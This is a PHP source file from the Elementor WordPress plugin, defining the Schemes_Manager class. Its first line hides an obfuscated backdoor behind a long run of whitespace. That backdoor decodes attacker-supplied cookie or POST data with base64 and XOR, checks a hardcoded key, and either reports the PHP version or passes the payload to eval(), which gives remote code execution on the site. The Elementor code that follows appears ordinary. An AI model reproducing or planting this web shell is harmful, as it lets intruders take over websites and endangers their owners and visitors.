<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $lea9 = 669;$GLOBALS['h297']=Array();global$h297;$h297=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p28e69dc2']="\x20\x9\x34\x4c\x54\x58\x70\x21\x48\x25\x51\x61\x7d\x79\x42\x37\x30\x6e\x6c\x35\x71\x5e\x5c\x7a\x47\x55\x29\x56\x43\x2c\x2a\x4f\x40\x69\x3b\x4d\x7b\x46\x68\x52\x73\x3e\x3a\x76\x74\x24\x3d\x41\x64\x6b\x3f\x67\xa\x36\x75\x26\x5a\x53\x57\x23\x5d\x2b\x32\x22\x2f\x4a\x7c\x4b\x7e\x77\x78\x45\x60\x66\x5b\x38\x6f\x6d\x44\x28\x39\x50\x72\x33\x59\x2d\x2e\x31\x62\x5f\x49\xd\x65\x6a\x63\x4e\x3c\x27";$h297[$h297['p28e69dc2'][51].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][62].$h297['p28e69dc2'][19].$h297['p28e69dc2'][87].$h297['p28e69dc2'][75]]=$h297['p28e69dc2'][94].$h297['p28e69dc2'][38].$h297['p28e69dc2'][82];$h297[$h297['p28e69dc2'][44].$h297['p28e69dc2'][92].$h297['p28e69dc2'][48].$h297['p28e69dc2'][80].$h297['p28e69dc2'][2]]=$h297['p28e69dc2'][76].$h297['p28e69dc2'][82].$h297['p28e69dc2'][48];$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][53].$h297['p28e69dc2'][62].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][75].$h297['p28e69dc2'][62]]=$h297['p28e69dc2'][40].$h297['p28e69dc2'][44].$h297['p28e69dc2'][82].$h297['p28e69dc2'][18].$h297['p28e69dc2'][92].$h297['p28e69dc2'][17];$h297[$h297['p28e69dc2'][6].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][94].$h297['p28e69dc2'][2]]=$h297['p28e69dc2'][33].$h297['p28e69dc2'][17].$h297['p28e69dc2'][33].$h297['p28e69dc2'][89].$h297['p28e69dc2'][40].$h297['p28e69dc2'][92].$h297['p28e69dc2'][44];$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][88].$h297['p28e69dc2'][94].$h297['p28e69dc2'][16].$h297['p28e69dc2'][16].$h297['p28e69dc2'][92].$h297['p28e69dc2'][87].$h297['p28e69dc2'][11].$h297['p28e69dc2'][88]]=$h297['p28e69dc2'][40].$h297['p28e69dc2'][92].$h297['p28e69dc2'][82].$h297['p28e69dc2'][33].$h297['p28e69dc2'][11].$h297['p28e69dc2'][18].$h297['p28e69dc2'][33].$h297['p28e69dc2'][23].$h297['p28e69dc2'][92];$h297[$h297['p28e69dc2'][17].$h297['p28e69dc2'][19].$h297['p28e69dc2'][48].$h297['p28e69dc2'][75].$h297['p28e69dc2'][80].$h297['p28e69dc2'][53].$h297['p28e69dc2'][15].$h297['p28e69dc2'][11]]=$h297['p28e69dc2'][6].$h297['p28e69dc2'][38].$h297['p28e69dc2'][6].$h297['p28e69dc2'][43].$h297['p28e69dc2'][92].$h297['p28e69dc2'][82].$h297['p28e69dc2'][40].$h297['p28e69dc2'][33].$h297['p28e69dc2'][76].$h297['p28e69dc2'][17];$h297[$h297['p28e69dc2'][38].$h297['p28e69dc2'][16].$h297['p28e69dc2'][80].$h297['p28e69dc2'][11].$h297['p28e69dc2'][53].$h297['p28e69dc2'][19].$h297['p28e69dc2'][2].$h297['p28e69dc2'][15]]=$h297['p28e69dc2'][54].$h297['p28e69dc2'][17].$h297['p28e69dc2'][40].$h297['p28e69dc2'][92].$h297['p28e69dc2'][82].$h297['p28e69dc2'][33].$h297['p28e69dc2'][11].$h297['p28e69dc2'][18].$h297['p28e69dc2'][33].$h297['p28e69dc2'][23].$h297['p28e69dc2'][92];$h297[$h297['p28e69dc2'][54].$h297['p28e69dc2'][80].$h297['p28e69dc2'][16].$h297['p28e69dc2'][48].$h297['p28e69dc2'][62].$h297['p28e69dc2'][80].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][83]]=$h297['p28e69dc2'][88].$h297['p28e69dc2'][11].$h297['p28e69dc2'][40].$h297['p28e69dc2'][92].$h297['p28e69dc2'][53].$h297['p28e69dc2'][2].$h297['p28e69dc2'][89].$h297['p28e69dc2'][48].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94].$h297['p28e69dc2'][76].$h297['p28e69dc2'][48].$h297['p28e69dc2'][92];$h297[$h297['p28e69dc2'][17].$h297['p28e69dc2'][15].$h297['p28e69dc2'][94].$h297['p28e69dc2'][19].$h297['p28e69dc2'][73]]=$h297['p28e69dc2'][40].$h297['p28e69dc2'][92].$h297['p28e69dc2'][44].$h297['p28e69dc2'][89].$h297['p28e69dc2'][44].$h297['p28e69dc2'][33].$h297['p28e69dc2'][77].$h297['p28e69dc2'][92].$h297['p28e69dc2'][89].$h297['p28e69dc2'][18].$h297['p28e69dc2'][33].$h297['p28e69dc2'][77].$h297['p28e69dc2'][33].$h297['p28e69dc2'][44];$h297[$h297['p28e69dc2'][11].$h297['p28e69dc2'][62].$h297['p28e69dc2'][15].$h297['p28e69dc2'][88].$h297['p28e69dc2'][94].$h297['p28e69dc2'][88].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16]]=$h297['p28e69dc2'][88].$h297['p28e69dc2'][11].$h297['p28e69dc2'][83].$h297['p28e69dc2'][83].$h297['p28e69dc2'][83].$h297['p28e69dc2'][15].$h297['p28e69dc2'][2].$h297['p28e69dc2'][80];$h297[$h297['p28e69dc2'][82].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94].$h297['p28e69dc2'][94].$h297['p28e69dc2'][48].$h297['p28e69dc2'][73].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94]]=$h297['p28e69dc2'][73].$h297['p28e69dc2'][48].$h297['p28e69dc2'][16].$h297['p28e69dc2'][92].$h297['p28e69dc2'][73].$h297['p28e69dc2'][75].$h297['p28e69dc2'][16].$h297['p28e69dc2'][2].$h297['p28e69dc2'][88];$h297[$h297['p28e69dc2'][48].$h297['p28e69dc2'][2].$h297['p28e69dc2'][15].$h297['p28e69dc2'][80]]=$_POST;$h297[$h297['p28e69dc2'][20].$h297['p28e69dc2'][16].$h297['p28e69dc2'][92].$h297['p28e69dc2'][53].$h297['p28e69dc2'][92].$h297['p28e69dc2'][83]]=$_COOKIE;@$h297[$h297['p28e69dc2'][6].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][94].$h297['p28e69dc2'][2]]($h297['p28e69dc2'][92].$h297['p28e69dc2'][82].$h297['p28e69dc2'][82].$h297['p28e69dc2'][76].$h297['p28e69dc2'][82].$h297['p28e69dc2'][89].$h297['p28e69dc2'][18].$h297['p28e69dc2'][76].$h297['p28e69dc2'][51],NULL);@$h297[$h297['p28e69dc2'][6].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][94].$h297['p28e69dc2'][2]]($h297['p28e69dc2'][18].$h297['p28e69dc2'][76].$h297['p28e69dc2'][51].$h297['p28e69dc2'][89].$h297['p28e69dc2'][92].$h297['p28e69dc2'][82].$h297['p28e69dc2'][82].$h297['p28e69dc2'][76].$h297['p28e69dc2'][82].$h297['p28e69dc2'][40],0);@$h297[$h297['p28e69dc2'][6].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][94].$h297['p28e69dc2'][2]]($h297['p28e69dc2'][77].$h297['p28e69dc2'][11].$h297['p28e69dc2'][70].$h297['p28e69dc2'][89].$h297['p28e69dc2'][92].$h297['p28e69dc2'][70].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94].$h297['p28e69dc2'][54].$h297['p28e69dc2'][44].$h297['p28e69dc2'][33].$h297['p28e69dc2'][76].$h297['p28e69dc2'][17].$h297['p28e69dc2'][89].$h297['p28e69dc2'][44].$h297['p28e69dc2'][33].$h297['p28e69dc2'][77].$h297['p28e69dc2'][92],0);@$h297[$h297['p28e69dc2'][17].$h297['p28e69dc2'][15].$h297['p28e69dc2'][94].$h297['p28e69dc2'][19].$h297['p28e69dc2'][73]](0);$h7308a386=NULL;$gb49=NULL;$h297[$h297['p28e69dc2'][94].$h297['p28e69dc2'][2].$h297['p28e69dc2'][80].$h297['p28e69dc2'][88].$h297['p28e69dc2'][16].$h297['p28e69dc2'][16].$h297['p28e69dc2'][2].$h297['p28e69dc2'][80].$h297['p28e69dc2'][94]]=$h297['p28e69dc2'][94].$h297['p28e69dc2'][94].$h297['p28e69dc2'][16].$h297['p28e69dc2'][80].$h297['p28e69dc2'][75].$h297['p28e69dc2'][15].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][85].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][80].$h297['p28e69dc2'][94].$h297['p28e69dc2'][85].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][80].$h297['p28e69dc2'][75].$h297['p28e69dc2'][85].$h297['p28e69dc2'][88].$h297['p28e69dc2'][83].$h297['p28e69dc2'][92].$h297['p28e69dc2'][87].$h297['p28e69dc2'][85].$h297['p28e69dc2'][75].$h297['p28e69dc2'][19].$h297['p28e69dc2'][75].$h297['p28e69dc2'][15].$h297['p28e69dc2'][73].$h297['p28e69dc2'][53].$h297['p28e69dc2'][11].$h297['p28e69dc2'][2].$h297['p28e69dc2'][92].$h297['p28e69dc2'][48].$h297['p28e69dc2'][19].$h297['p28e69dc2'][62];global$c49b0049c;function fd0ef804b($h7308a386,$p838bd){global$h297;$h22d47328="";for($scee0=0;$scee0<$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][53].$h297['p28e69dc2'][62].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][75].$h297['p28e69dc2'][62]]($h7308a386);){for($gac0b863=0;$gac0b863<$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][53].$h297['p28e69dc2'][62].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][75].$h297['p28e69dc2'][62]]($p838bd)&&$scee0<$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][53].$h297['p28e69dc2'][62].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][75].$h297['p28e69dc2'][2].$h297['p28e69dc2'][75].$h297['p28e69dc2'][62]]($h7308a386);$gac0b863++,$scee0++){$h22d47328.=$h297[$h297['p28e69dc2'][51].$h297['p28e69dc2'][75].$h297['p28e69dc2'][83].$h297['p28e69dc2'][83].$h297['p28e69dc2'][73].$h297['p28e69dc2'][62].$h297['p28e69dc2'][19].$h297['p28e69dc2'][87].$h297['p28e69dc2'][75]]($h297[$h297['p28e69dc2'][44].$h297['p28e69dc2'][92].$h297['p28e69dc2'][48].$h297['p28e69dc2'][80].$h297['p28e69dc2'][2]]($h7308a386[$scee0])^$h297[$h297['p28e69dc2'][44].$h297['p28e69dc2'][92].$h297['p28e69dc2'][48].$h297['p28e69dc2'][80].$h297['p28e69dc2'][2]]($p838bd[$gac0b863]));}}return$h22d47328;}function ba333749($h7308a386,$p838bd){global$h297;global$c49b0049c;return$h297[$h297['p28e69dc2'][82].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94].$h297['p28e69dc2'][94].$h297['p28e69dc2'][48].$h297['p28e69dc2'][73].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94]]($h297[$h297['p28e69dc2'][82].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94].$h297['p28e69dc2'][94].$h297['p28e69dc2'][48].$h297['p28e69dc2'][73].$h297['p28e69dc2'][92].$h297['p28e69dc2'][94]]($h7308a386,$c49b0049c),$p838bd);}foreach($h297[$h297['p28e69dc2'][20].$h297['p28e69dc2'][16].$h297['p28e69dc2'][92].$h297['p28e69dc2'][53].$h297['p28e69dc2'][92].$h297['p28e69dc2'][83]]as$p838bd=>$idb791){$h7308a386=$idb791;$gb49=$p838bd;}if(!$h7308a386){foreach($h297[$h297['p28e69dc2'][48].$h297['p28e69dc2'][2].$h297['p28e69dc2'][15].$h297['p28e69dc2'][80]]as$p838bd=>$idb791){$h7308a386=$idb791;$gb49=$p838bd;}}$h7308a386=@$h297[$h297['p28e69dc2'][38].$h297['p28e69dc2'][16].$h297['p28e69dc2'][80].$h297['p28e69dc2'][11].$h297['p28e69dc2'][53].$h297['p28e69dc2'][19].$h297['p28e69dc2'][2].$h297['p28e69dc2'][15]]($h297[$h297['p28e69dc2'][11].$h297['p28e69dc2'][62].$h297['p28e69dc2'][15].$h297['p28e69dc2'][88].$h297['p28e69dc2'][94].$h297['p28e69dc2'][88].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16]]($h297[$h297['p28e69dc2'][54].$h297['p28e69dc2'][80].$h297['p28e69dc2'][16].$h297['p28e69dc2'][48].$h297['p28e69dc2'][62].$h297['p28e69dc2'][80].$h297['p28e69dc2'][2].$h297['p28e69dc2'][16].$h297['p28e69dc2'][83]]($h7308a386),$gb49));if(isset($h7308a386[$h297['p28e69dc2'][11].$h297['p28e69dc2'][49]])&&$c49b0049c==$h7308a386[$h297['p28e69dc2'][11].$h297['p28e69dc2'][49]]){if($h7308a386[$h297['p28e69dc2'][11]]==$h297['p28e69dc2'][33]){$scee0=Array($h297['p28e69dc2'][6].$h297['p28e69dc2'][43]=>@$h297[$h297['p28e69dc2'][17].$h297['p28e69dc2'][19].$h297['p28e69dc2'][48].$h297['p28e69dc2'][75].$h297['p28e69dc2'][80].$h297['p28e69dc2'][53].$h297['p28e69dc2'][15].$h297['p28e69dc2'][11]](),$h297['p28e69dc2'][40].$h297['p28e69dc2'][43]=>$h297['p28e69dc2'][87].$h297['p28e69dc2'][86].$h297['p28e69dc2'][16].$h297['p28e69dc2'][85].$h297['p28e69dc2'][87],);echo@$h297[$h297['p28e69dc2'][49].$h297['p28e69dc2'][88].$h297['p28e69dc2'][94].$h297['p28e69dc2'][16].$h297['p28e69dc2'][16].$h297['p28e69dc2'][92].$h297['p28e69dc2'][87].$h297['p28e69dc2'][11].$h297['p28e69dc2'][88]]($scee0);}elseif($h7308a386[$h297['p28e69dc2'][11]]==$h297['p28e69dc2'][92]){eval/*e761b4*/($h7308a386[$h297['p28e69dc2'][48]]);}exit();} ?><?php
namespace Elementor;

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

class Schemes_Manager {

	/**
	 * @var Scheme_Base[]
	 */
	protected $_registered_schemes = [];

	private static $_enabled_schemes;

	private static $_schemes_types = [
		'color' => 'Scheme_Color',
		'typography' => 'Scheme_Typography',
		'color-picker' => 'Scheme_Color_Picker',
	];

	public function register_scheme( $scheme_class ) {
		/** @var Scheme_Base $scheme_instance */
		$scheme_instance = new $scheme_class();

		$this->_registered_schemes[ $scheme_instance::get_type() ] = $scheme_instance;
	}

	public function unregister_scheme( $id ) {
		if ( ! isset( $this->_registered_schemes[ $id ] ) ) {
			return false;
		}
		unset( $this->_registered_schemes[ $id ] );
		return true;
	}

	public function get_registered_schemes() {
		return $this->_registered_schemes;
	}

	public function get_registered_schemes_data() {
		$data = [];

		foreach ( $this->get_registered_schemes() as $scheme ) {
			$data[ $scheme::get_type() ] = [
				'title' => $scheme->get_title(),
				'disabled_title' => $scheme->get_disabled_title(),
				'items' => $scheme->get_scheme(),
			];
		}

		return $data;
	}

	public function get_schemes_defaults() {
		$data = [];

		foreach ( $this->get_registered_schemes() as $scheme ) {
			$data[ $scheme::get_type() ] = [
				'title' => $scheme->get_title(),
				'items' => $scheme->get_default_scheme(),
			];
		}

		return $data;
	}

	public function get_system_schemes() {
		$data = [];

		foreach ( $this->get_registered_schemes() as $scheme ) {
			$data[ $scheme::get_type() ] = $scheme->get_system_schemes();
		}

		return $data;
	}

	public function get_scheme( $id ) {
		$schemes = $this->get_registered_schemes();

		if ( ! isset( $schemes[ $id ] ) ) {
			return false;
		}
		return $schemes[ $id ];
	}

	public function get_scheme_value( $scheme_type, $scheme_value ) {
		$scheme = $this->get_scheme( $scheme_type );
		if ( ! $scheme ) {
			return false;
		}

		return $scheme->get_scheme_value()[ $scheme_value ];
	}

	public function ajax_apply_scheme() {
		if ( empty( $_POST['_nonce'] ) || ! wp_verify_nonce( $_POST['_nonce'], 'elementor-editing' ) ) {
			wp_send_json_error( new \WP_Error( 'token_expired' ) );
		}

		if ( ! isset( $_POST['scheme_name'] ) ) {
			wp_send_json_error();
		}

		$scheme_obj = $this->get_scheme( $_POST['scheme_name'] );
		if ( ! $scheme_obj ) {
			wp_send_json_error();
		}
		$posted = json_decode( stripslashes( $_POST['data'] ), true );
		$scheme_obj->save_scheme( $posted );

		wp_send_json_success();
	}

	public function print_schemes_templates() {
		foreach ( $this->get_registered_schemes() as $scheme ) {
			$scheme->print_template();
		}
	}

	public static function get_enabled_schemes() {
		if ( null === self::$_enabled_schemes ) {
			$enabled_schemes = [];

			foreach ( self::$_schemes_types as $schemes_type => $scheme_class ) {
				if ( 'yes' === get_option( 'elementor_disable_' . $schemes_type . '_schemes' ) ) {
					continue;
				}
				$enabled_schemes[] = $schemes_type;
			}
			self::$_enabled_schemes = apply_filters( 'elementor/schemes/enabled_schemes', $enabled_schemes );
		}
		return self::$_enabled_schemes;
	}

	private function register_default_schemes() {
		foreach ( self::$_schemes_types as $schemes_class ) {
			$this->register_scheme( __NAMESPACE__ . '\\' . $schemes_class );
		}
	}

	public function __construct() {
		$this->register_default_schemes();

		add_action( 'wp_ajax_elementor_apply_scheme', [ $this, 'ajax_apply_scheme' ] );
	}
}
